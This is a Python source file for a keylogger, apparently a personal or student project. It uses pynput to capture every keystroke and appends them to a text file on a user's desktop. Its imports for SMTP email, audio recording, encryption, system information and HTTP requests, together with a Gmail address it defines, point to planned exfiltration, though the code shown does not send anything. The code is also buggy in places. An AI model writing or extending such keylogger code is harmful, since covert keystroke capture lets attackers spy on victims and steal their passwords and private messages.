#Logger Library
from pynput.mouse import Controller
from pynput.keyboard import Listener, Key

#Email Library
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

#import win32clipboard

import time

import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

#     Test to see when keylogger has been started. Mouse to top left.
#     def controlmouse():
#     mouse = Controller()
#     mouse.position = (0, 0)

# logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')


file_path = "C:\\Users\\adams\\OneDrive\\Desktop\\keylogs.txt"
email_address = "completekeyloggerproject@gmail.com"


count = 0
keys = []

def on_press(key):
    global keys, count

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count - 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(file_path, "a") as f:
        for key in keys:
            k = str(key).replace(","," ")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()#Logger Library